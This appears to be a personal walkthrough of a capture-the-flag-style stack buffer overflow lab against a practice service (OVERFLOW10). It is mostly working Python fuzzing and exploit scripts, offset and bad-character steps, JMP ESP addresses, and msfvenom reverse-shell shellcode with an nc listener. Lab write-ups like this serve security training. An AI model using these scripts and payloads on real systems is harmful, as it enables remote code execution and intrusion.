# jmp: Address of the instruction that redirects execution flow to our shellcode
# "\x03\x11\x50\x62" is the memory address that contains "jmp esp" or a similar instruction
jmp = "\xAF\x11\x50\x62"
    #ESP 625011AF

# NOP sled: Helps guide the execution smoothly into the shellcode by filling with NOP instructions
nops = 16 * "\x90"  # 16 NOP instructions (0x90 is a NOP in x86 architecture)

# Complete exploit string, combining all parts
string = Command + Offset + jmp + shellcode

try:
    # Creating a socket object for TCP communication
    with socket.socket() as s:
        # Attempt to connect to the target IP and port
        s.connect((ip, port))
        print("Sending exploit payload...")
        # Sending the crafted exploit payload
        s.send(bytes(string, 'latin-1'))
        
except Exception as e:
    # If an error occurs during connection or sending, print the error
    print("Failed to connect or send the payload:", e)


```


36. Run nc listener and execute payload

![800](img/Pasted%20image%2020240902181357.png)

![800](img/Pasted%20image%2020240902181406.png)


37. Verify connection, pwnd!

![800](img/Pasted%20image%2020240903183024.png)



# Task 11 oscp.exe - OVERFLOW10

1. In Kali. Using Remmina, remote to target machine.

![800](img/Pasted%20image%2020240821141857.png)


2. In target machine. Right click Immunity Debugger > Run as administrator. File > Open > Desktop\\vulnerable-apps\\oscp\\oscp. Click red play button, will show Running. 

![800](img/Pasted%20image%2020240905163419.png)


4. In Kali. Open a terminal. NC to the target machine with port 1337. Type "HELP" to view the commands. Type "OVERFLOW8 test" to verify.

![800](img/Pasted%20image%2020240905163450.png)


5. In target machine. In the Immunity Debugger. Input the mona command.

`!mona config -set workingfolder c:\mona\%p

![800](img/Pasted%20image%2020240905163527.png)


6. In Kali. Create a script, fuzzer.py.

```python
#!/usr/bin/env python3

import socket, time, sys  # Import necessary modules: socket for networking, time for delays, sys for exiting the script

# Define the target IP address or hostname
ip = "target.local"

# Define the target port number
port = 1337

# Set the timeout duration (in seconds) for the socket connection
timeout = 5

# Define a prefix to prepend to the payload being sent
prefix = "OVERFLOW10 "

# Initialize the payload with the prefix followed by 100 "A" characters
string = prefix + "A" * 100

# Start an infinite loop to continually send increasing payload sizes
while True:
    try:
        # Create a new socket object for IPv4 (AF_INET) and TCP (SOCK_STREAM)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            # Set the timeout for the socket connection
            s.settimeout(timeout)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Receive the initial response from the server (optional step to ensure connection)
            s.recv(1024)
            
            # Print the current size of the payload being sent (excluding the prefix)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            
            # Send the payload to the target server, encoding it as a Latin-1 byte string
            s.send(bytes(string, "latin-1"))
            
            # Receive the server's response (optional step to ensure the payload was sent)
            s.recv(1024)
    
    # If an exception occurs (e.g., the server crashes or connection fails), handle it here
    except:
        # Print the size of the payload that caused the crash and exit the script
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    
    # Increase the size of the payload by 100 "A" characters for the next iteration
    string += 100 * "A"
    
    # Wait 1 second before sending the next payload (to avoid overwhelming the server)
    time.sleep(1)

```


7. In Kali. Create a script, exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW10 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = ""           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


8. In target machine. Immunity Debugger > Debug > Restart > Play.


9. In Kali. Execute the fuzzer.py. The Immunity Debugger will crash and pause.

![800](img/Pasted%20image%2020240905163806.png)


10. Fuzzing crashed at 600 bytes. Create a pattern by adding 400 bytes, total of 1000 bytes. 

![800](img/Pasted%20image%2020240905163820.png)


11. Immunity Debugger showing EIP 41414141 overwritten with A(hex=41).

![800](img/Pasted%20image%2020240905163843.png)


12. In Kali. Create msf pattern.

`msf-pattern_create -l 1000

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```


13. In Kali. Edit the script exploit.py and add the output of the msf-pattern.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW10 "  # The command or identifier expected by the target service
offset = 0             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = ""              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


14. In target machine. Immunity Debugger > Debug > Restart > Play.


15. In Kali. Execute the exploit.py.

![800](img/Pasted%20image%2020240821150355.png)


16. Immunity Debugger. EIP 41397241.

![800](img/Pasted%20image%2020240905164332.png)


17. In Kali. Get the offset value of the EIP.

```shell
┌──(root㉿kali)-[/transfer]
└─# msf-pattern_offset -l 1000 -q 41397241
[*] Exact match at offset 537
```

EIP Offset is 537.

	Task 11
		a. What is the EIP offset for OVERFLOW10?
			537


18. In Kali. Edit the exploit.py. Add the offset 537 and put a retn to be reflected, can use "BBBB"

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW10 "  # The command or identifier expected by the target service
offset = 537            # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details

```


19. In target machine. Immunity Debugger > Debug > Restart > Play.


20. In Kali. Execute exploit.py.

![800](img/Pasted%20image%2020240821152534.png)


21. Immunity Debugger. Note the value ESP 0181FA30.

![800](img/Pasted%20image%2020240905164559.png)


22. In Immunity Debugger. Create a BADCHARS using mona. By default the syntax \\x00 is a BADCHAR.

`!mona bytearray -b "\x00"

![800](img/Pasted%20image%2020240905164723.png)


23. Creating bad chars. In Kali. By using a python script. Generate a string of bad chars from \\x01 to \\xff.

```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00

```


24. Using the generated bad chars, copy and edit the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW10 "  # The command or identifier expected by the target service
offset = 537             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```


25. In target machine. Immunity Debugger > Debug > Restart > Play.


26. Execute exploit.py

```shell
┌──(root㉿kali)-[/transfer]
└─# python3 exploit.py
Sending evil buffer...
Done!
```


27. In Immunity Debugger.  ESP 01B2FA30

![800](img/Pasted%20image%2020240905164907.png)


28. In Immunity Debugger. Run the mona command to compare the bin and ESP value.

`!mona compare -f C:\mona\oscp\bytearray.bin -a 01B2FA30

![800](img/Pasted%20image%2020240905164958.png)

mona Memory comparison results, item 0
 Address=0x01b2fa30
 Status=Corruption after 159 bytes
 BadChars=00 a0 a1 ad ae be bf de df ef f0
 Type=normal
 Location=Stack



29. Based on the output 00 a0 a1 ad ae be bf de df ef f0. Only use 00 a0 ad be de ef to be excluded in creating the bad chars. Edit the create.py.


```python
#!/usr/bin/env python3

from __future__ import print_function

#tart with 00 and add any others you find
bad = "00 a0 ad be de ef".split()

#turns them into a nice string to copy into python
print("badchars = ")
for x in range(1, 256):
	if "{:02x}".format(x) not in bad: 
		print("\\x" + "{:02x}".format(x), end='')

#creates a nice string to use in Mona
print("\n\nfor mona")
for byte in bad:
	print("\\x{}".format(byte), end='')
print()
```


```shell
┌──(root㉿kali)-[/transfer]
└─# python3 create.py 
badchars = 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

for mona
\x00\xa0\xad\xbe\xde\xef

```

	Task 11
		b. In byte order (e.g. \x00\x01\x02) and including the null byte \x00, what were the badchars for OVERFLOW10?
			\x00\xa0\xad\xbe\xde\xef


30. In target machine. Immunity Debugger. Tell mona to update the bytearray.

`!mona bytearray -b "\x00\xa0\xad\xbe\xde\xef"

![800](img/Pasted%20image%2020240905165243.png)


31. In target machine. Immunity Debugger > Debug > Restart > Play.


32. Edit the exploit.py with the bad chars. Then execute the exploit.py.

```python
import socket  # Import the socket module to create and manage network connections

# Target configuration
ip = "target.local"  # The IP address of the target system
port = 1337          # The port on which the target service is listening

# Buffer composition
prefix = "OVERFLOW10 "  # The command or identifier expected by the target service
offset = 537             # The number of bytes needed to reach the return address
overflow = "A" * offset  # Filling the buffer up to the offset with "A"s
retn = "BBBB"              # Placeholder for the return address (where execution should jump)
padding = ""           # Optional padding between the return address and the payload
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"           # The malicious payload (e.g., shellcode) to execute on the target
postfix = ""           # Any additional data that needs to be sent after the payload

# Final buffer
buffer = prefix + overflow + retn + padding + payload + postfix  # Combine all parts to form the final buffer

# Socket setup and buffer sending
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP socket
try:
    s.connect((ip, port))  # Attempt to connect to the target IP and port
    print("Sending evil buffer...")  # Inform that the buffer is being sent
    s.send(bytes(buffer + "\r\n", "latin-1"))  # Send the buffer, ensuring it is encoded in "latin-1"
    print("Done!")  # Confirm that the buffer was sent successfully
except Exception as e:  # If an error occurs (e.g., connection fails)
    print(f"Could not connect: {e}")  # Print an error message with details
```

![](img/Pasted%20image%2020240829171740.png)


31. Immunity Debugger. Compare using mona.

** Do not restart Immunity Debbuger.

`!mona compare -f C:\mona\oscp\bytearray.bin -a esp

![800](img/Pasted%20image%2020240905165924.png)


32. Immunity Debugger > Debug > Restart


33. Use the command mona jmp, the esp and the excluded bad chars.

`!mona jmp -r esp -cpb "\x00\xa0\xad\xbe\xde\xef"

Go to View > Log 
From the Log Data, select the JMP ESP and double click to open.

![800](img/Pasted%20image%2020240905170130.png)

![800](img/Pasted%20image%2020240905170155.png)

![800](img/Pasted%20image%2020240905170222.png)

Possible JMP ESP:

625011AF
625011BB
625011C7
625011D3
625011DF
625011EB
625011F7

`\xAF\x11\x50\x62
`\xBB\x11\x50\x62
`\xC7\x11\x50\x62
`\xD3\x11\x50\x62
`\xDF\x11\x50\x62`
`\xEB\x11\x50\x62
`\xF7\x11\x50\x62`


34. Create shellcode using msfvenom

`msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\xa0\xad\xbe\xde\xef" -f python -v "shellcode"


```shell
┌──(root㉿kali)-[/transfer]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9009 EXITFUNC=thread -b "\x00\xa0\xad\xbe\xde\xef" -f python -v "shellcode"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1953 bytes
shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x15\xf4\x1a\x8f\x83\xee\xfc"
shellcode += b"\xe2\xf4\xe9\x1c\x98\x8f\x15\xf4\x7a\x06\xf0"
shellcode += b"\xc5\xda\xeb\x9e\xa4\x2a\x04\x47\xf8\x91\xdd"
shellcode += b"\x01\x7f\x68\xa7\x1a\x43\x50\xa9\x24\x0b\xb6"
shellcode += b"\xb3\x74\x88\x18\xa3\x35\x35\xd5\x82\x14\x33"
shellcode += b"\xf8\x7d\x47\xa3\x91\xdd\x05\x7f\x50\xb3\x9e"
shellcode += b"\xb8\x0b\xf7\xf6\xbc\x1b\x5e\x44\x7f\x43\xaf"
shellcode += b"\x14\x27\x91\xc6\x0d\x17\x20\xc6\x9e\xc0\x91"
shellcode += b"\x8e\xc3\xc5\xe5\x23\xd4\x3b\x17\x8e\xd2\xcc"
shellcode += b"\xfa\xfa\xe3\xf7\x67\x77\x2e\x89\x3e\xfa\xf1"
shellcode += b"\xac\x91\xd7\x31\xf5\xc9\xe9\x9e\xf8\x51\x04"
shellcode += b"\x4d\xe8\x1b\x5c\x9e\xf0\x91\x8e\xc5\x7d\x5e"
